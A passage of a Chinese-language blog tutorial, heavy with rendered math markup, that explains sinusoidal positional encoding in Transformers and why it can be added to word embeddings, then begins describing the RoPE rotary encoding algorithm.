displaystyle="false"><mrow><msub><mi>f</mi><mn>0</mn></msub><mo stretchy="false">(</mo><mn>2</mn><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>f</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mn>2</mn><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>f</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mn>2</mn><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">P = \begin{bmatrix}
 f_{0}(0) &amp; f_{1}(0) &amp; f_{2}(0)\\
  f_{0}(1)&amp;  f_{1}(1)&amp;f_{2}(1) \\
  f_{0}(2)&amp;  f_{1}(2)&amp;f_{2}(2)
\end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:3.6em;vertical-align:-1.55em;"/><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.05em;"><span class="pstrut" style="height:5.6em;"/><span style="width:0.667em;height:3.600em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.667em" height="3.600em" viewbox="0 0 667 3600"><path d="M403 1759 V84 H666 V0 H319 V1759 v0 v1759 h347 v-84&#10;H403z M403 1759 V0 H319 V1759 v0 v1759 h84z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1076em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mopen">(</span><span class="mord">0</span><span class="mclose">)</span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1076em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1076em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mopen">(</span><span class="mord">2</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span><span class="arraycolsep" style="width:0.5em;"/><span class="arraycolsep" style="width:0.5em;"/><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1076em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mopen">(</span><span class="mord">0</span><span class="mclose">)</span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1076em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1076em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mopen">(</span><span class="mord">2</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span><span class="arraycolsep" style="width:0.5em;"/><span class="arraycolsep" style="width:0.5em;"/><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1076em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mopen">(</span><span class="mord">0</span><span class="mclose">)</span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1076em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1076em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mopen">(</span><span class="mord">2</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.05em;"><span class="pstrut" style="height:5.6em;"/><span style="width:0.667em;height:3.600em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.667em" height="3.600em" viewbox="0 0 667 3600"><path d="M347 1759 V0 H0 V84 H263 V1759 v0 v1759 H0 v84 H347z&#10;M347 1759 V0 H263 V1759 v0 v1759 h84z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span></span></span></span></span></span></span></div>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>f</mi><mi>i</mi></msub><mo stretchy="false">(</mo><mi>t</mi><mo stretchy="false">)</mo><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.16em" columnalign="center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>s</mi><mi>i</mi><mi>n</mi><mo stretchy="false">(</mo><mfrac><mi>t</mi><mrow><mn>1</mn><msup><mn>0</mn><mrow><mn>8</mn><mi>i</mi><mi mathvariant="normal">/</mi><mi>D</mi></mrow></msup></mrow></mfrac><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>i</mi><mtext>为偶数</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>c</mi><mi>o</mi><mi>s</mi><mo stretchy="false">(</mo><mfrac><mi>t</mi><mrow><mn>1</mn><msup><mn>0</mn><mrow><mn>8</mn><mi>i</mi><mi mathvariant="normal">/</mi><mi>D</mi></mrow></msup></mrow></mfrac><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>i</mi><mtext>为奇数</mtext></mrow></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding="application/x-tex">f_{i}(t) = \left\{\begin{matrix}
  sin(\frac{t}{10^{8i/D}} )
&amp; 
 i为偶数
\\
cos(\frac{t}{10^{8i/D}} )
  &amp;
i为奇数
\end{matrix}\right.</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1076em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">t</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:2.4508em;vertical-align:-0.9754em;"/><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">{</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.4754em;"><span style="top:-3.6354em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal">s</span><span class="mord mathnormal">in</span><span class="mopen">(</span><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8246em;"><span style="top:-2.6146em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight"><span class="mord mtight">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.822em;"><span style="top:-2.822em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5357em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">8</span><span class="mord mathnormal mtight">i</span><span class="mord mtight">/</span><span class="mord mathnormal mtight" style="margin-right:0.02778em;">D</span></span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3854em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mclose">)</span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal">cos</span><span class="mopen">(</span><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8246em;"><span style="top:-2.6146em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight"><span class="mord mtight">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.822em;"><span style="top:-2.822em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5357em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">8</span><span class="mord mathnormal mtight">i</span><span class="mord mtight">/</span><span class="mord mathnormal mtight" style="margin-right:0.02778em;">D</span></span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3854em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9754em;"><span/></span></span></span></span><span class="arraycolsep" style="width:0.5em;"/><span class="arraycolsep" style="width:0.5em;"/><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.4754em;"><span style="top:-3.6354em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal">i</span><span class="mord cjk_fallback">为偶数</span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal">i</span><span class="mord cjk_fallback">为奇数</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9754em;"><span/></span></span></span></span></span></span><span class="mclose nulldelimiter"/></span></span></span></span></span></div>
<p>其中<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi></mrow><annotation encoding="application/x-tex">t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6151em;"/><span class="mord mathnormal">t</span></span></span></span></span>为序列中第<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi></mrow><annotation encoding="application/x-tex">t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6151em;"/><span class="mord mathnormal">t</span></span></span></span></span>个向量，<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>D</mi></mrow><annotation encoding="application/x-tex">D</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.02778em;">D</span></span></span></span></span>表示词向量的维度，<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"/><span class="mord mathnormal">i</span></span></span></span></span>表示第<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"/><span class="mord mathnormal">i</span></span></span></span></span>维，<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"/><span class="mord mathnormal">i</span></span></span></span></span>从0开始计算</p>
<p>其实当时我学到位置编码的时候，我就有一个疑问，为什么可以直接将位置编码和词向量进行相加？这样做难道不会破坏原有词向量本身所包含的信息吗？为什么这个相加操作就能赋予原序列位置信息？</p>
<p>下面举个形象一点的例子，想象一下我们的输入序列是一组图片（承载语义信息），而位置编码是一组透明的、印有位置序号（如1,2,3…）的胶片。</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/242eb01598a34875a6702da8d915573f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=oYoriw76J04hve2yCv2%2FhRrLAUM%3D" alt="c16.jpg" width="90%" loading="lazy"/></p>
<p>将胶片叠加到图片上后，你既能清晰地看到图片内容（语义），也能毫不费力地识别出叠加在上面的数字（位置）。两者信息是共存的。</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fb745a4c9a08420e915d774a4da8c757~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=tViPJhuLi3MPxMpo8UXuNmfdMBw%3D" alt="c17.jpg" width="90%" loading="lazy"/></p>
<p>你可能会说，不对呀，我们人脑可是见过很多图片和数字的，当然能轻松的看出来图片中嵌入了数字，但是Transformer它能看出来吗？加入的这些序列信息难道不会构成噪声吗？</p>
<p>不要忘了，Transformer可是大语言模型的基础架构，它可是非常强大的，Transformer区分原始序列中包含的序列信息可以说是再简单不过的事情了。</p>
<p>从数学上来解释，位置编码就是<strong>利用了高维表示空间的冗余度和深度神经网络的强大解耦能力</strong>，词向量通常存在于数百甚至数千维的高维空间中。在高维空间中，向量方向极其丰富，两个随机向量几乎总是近似正交的（点积接近零）。词向量和位置编码向量可以看作是从不同“坐标系”出发的向量。简单的相加，相当于在高维空间中进行了一次“合成”。在高维空间中，低相关性的向量相加不会导致信息丢失，反而形成唯一复合表示。</p>
<p>这里我们暂不深入探讨为何简单的二进制编码不被采用，而正弦余弦编码却如此有效——这背后涉及到很多数学理论上的东西了。但如果你对正余弦位置编码感兴趣，非常推荐看看这位UP主的讲解：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1XH4y1T76e%2F" target="_blank" title="https://www.bilibili.com/video/BV1XH4y1T76e/" ref="nofollow noopener noreferrer">王木头学科学</a></p>
<p>然而，技术总是在演进。在当今大语言模型的实践中，标准的正弦余弦位置编码已不再是主流的选择。研究者们发现，直接让模型关注<strong>元素的相对位置</strong>往往比记住绝对位置更为有效和泛化。因此，一系列更先进的<strong>相对位置编码</strong>方法应运而生，例如：ALiBi，RoPE, YaRN, T5 Relative...</p>
<p>由于RoPE旋转位置编码比较流行，下面就简单的讲解一下其算法流程</p>
<p>我们抛开所有上面讲过的内容，仅从数学的角度看看如何对任意矩阵<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span></span>进行RoPE变换</p>
<ul>
<li>
<p><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span></span>为<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">m</span></span></span></span></span>行<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal">d</span></span></span></span></span>列矩阵（共<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">m</span></span></span></span></span>个维度为<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal">d</span></span></span></span></span>的向量，<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal">d</span></span></span></span></span>必须为偶数）</p>
</li>
<li>
<p><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>x</mi><mi>n</mi><mrow><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo></mrow></msubsup></mrow><annotation encoding="application/x-tex">x_{n}^{[j]}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1614em;vertical-align:-0.1166em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.5834em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1166em;"><span/></span></span></span></span></span></span></span></span></span>表示第<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">n</span></span></span></span></span>行第<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span></span>列的数</p>
</li>
</ul>
<p>对每一行的向量做如下操作：</p>
<p>将第<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">n</span></span></span></span></span>行向量划分为<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mi mathvariant="normal">/</mi><mn>2</mn></mrow><annotation encoding="application/x-tex">d/2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal">d</span><span class="mord">/2</span></span></span></span></span>个二维子向量，即<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><msubsup><mi>x</mi><mi>n</mi><mrow><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo></mrow></msubsup><mo separator="true">,</mo><msubsup><mi>x</mi><mi>n</mi><mrow><mo stretchy="false">[</mo><mn>2</mn><mo stretchy="false">]</mo></mrow></msubsup><mo stretchy="false">]</mo><mo separator="true">,</mo><mo stretchy="false">[</mo><msubsup><mi>x</mi><mi>n</mi><mrow><mo stretchy="false">[</mo><mn>3</mn><mo stretchy="false">]</mo></mrow></msubsup><mo separator="true">,</mo><msubsup><mi>x</mi><mi>n</mi><mrow><mo stretchy="false">[</mo><mn>4</mn><mo stretchy="false">]</mo></mrow></msubsup><mo stretchy="false">]</mo><mo separator="true">,</mo><mo stretchy="false">[</mo><msubsup><mi>x</mi><mi>n</mi><mrow><mo stretchy="false">[</mo><mn>5</mn><mo stretchy="false">]</mo></mrow></msubsup><mo separator="true">,</mo><msubsup><mi>x</mi><mi>n</mi><mrow><mo stretchy="false">[</mo><mn>6</mn><mo stretchy="false">]</mo></mrow></msubsup><mo stretchy="false">]</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo stretchy="false">[</mo><msubsup><mi>x</mi><mi>n</mi><mrow><mo stretchy="false">[</mo><mi>d</mi><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo></mrow></msubsup><mo separator="true">,</mo><msubsup><mi>x</mi><mi>n</mi><mrow><mo stretchy="false">[</mo><mi>d</mi><mo stretchy="false">]</mo></mrow></msubsup><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[x_{n}^{[1]},x_{n}^{[2]}],[x_{n}^{[3]},x_{n}^{[4]}],[x_{n}^{[5]},x_{n}^{[6]}]...[x_{n}^{[d-1]},x_{n}^{[d]}]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2948em;vertical-align:-0.25em;"/><span class="mopen">[</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.5834em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mtight">1</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1166em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.5834em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mtight">2</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" 